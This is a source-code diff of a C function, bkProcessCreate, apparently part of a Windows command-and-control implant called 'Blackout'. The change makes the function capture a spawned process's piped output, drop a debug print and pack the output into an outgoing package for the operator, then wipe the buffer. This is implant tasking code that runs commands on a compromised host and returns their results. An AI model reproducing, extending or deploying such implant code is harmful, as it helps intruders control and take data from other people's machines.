@@ -86,7 +86,6 @@ FUNC DWORD bkProcessTerminate(
     return NtLastError();
 }
 
-
 FUNC DWORD bkProcessCreate(
     _In_      PSTR    ProcCmd,
     _In_      BOOL    InheritHandle,
@@ -95,9 +94,7 @@ FUNC DWORD bkProcessCreate(
     _Out_opt_ HANDLE *ProcessHandle,
     _Out_opt_ DWORD  *ProcessId,
     _Out_opt_ HANDLE *ThreadHandle,
-    _Out_opt_ DWORD  *ThreadId,
-    _In_opt_  PSTR    Output,
-    _Out_opt_ UINT32 *OutSize
+    _Out_opt_ DWORD  *ThreadId
 ) {
     BLACKOUT_INSTANCE
 
@@ -122,11 +119,16 @@ FUNC DWORD bkProcessCreate(
     UINT32                       PipesBytesRead = 0;
     UINT32                       PipeBufferSize = 0;
     SECURITY_ATTRIBUTES          SecAttr        = { 0 };
+    PVOID                        Output         = NULL;
+    UINT32                       OutSize        = 0;
 
-    MmZero( &Pi, sizeof( PROCESS_INFORMATION ) );
-    MmZero( &Si, sizeof( STARTUPINFOEXA ) );
+    MmZero( &Peb, sizeof( PEB ) );
+    MmZero( &Pbi, sizeof( PROCESS_BASIC_INFORMATION ) );
+    MmZero( &Pi,  sizeof( PROCESS_INFORMATION ) );
+    MmZero( &Si,  sizeof( STARTUPINFOEXA ) );
 
     if ( Pipe ) {
+        Output                       = Instance()->Win32.LocalAlloc( LPTR, 1025 );
         SecAttr.bInheritHandle       = TRUE;
         SecAttr.nLength              = sizeof( SECURITY_ATTRIBUTES );
         SecAttr.lpSecurityDescriptor = NULL;
@@ -185,8 +187,6 @@ FUNC DWORD bkProcessCreate(
         do {
             bPipeRead = Instance()->Win32.ReadFile( hStdPipeRead, Buffer, 1024, &PipesBytesRead, NULL );
 
-            BK_PRINT( "%s\n", Buffer );
-
             if ( !PipesBytesRead ) break;
 
             Output = Instance()->Win32.LocalReAlloc(
@@ -201,7 +201,7 @@ FUNC DWORD bkProcessCreate(
 
         } while ( bPipeRead );
 
-        *OutSize = PipeBufferSize;
+        OutSize = PipeBufferSize;
     }
 
 _Leave:
@@ -211,7 +211,14 @@ _Leave:
     if ( Upp           ) bkHeapFree( Upp, sizeof( RTL_USER_PROCESS_PARAMETERS ) );
     if ( hStdPipeRead  ) bkHandleClose( hStdPipeRead );
     if ( hStdPipeWrite ) bkHandleClose( hStdPipeWrite );
-
+    if ( Pipe ) {
+        if ( Output ) {
+            PackageAddBytes( BK_PACKAGE, Output, OutSize );
+            MmZero( Output, OutSize );
+            Instance()->Win32.LocalFree( Output );
+        }
+    } 
+    
     return NtLastError();    
 }
 
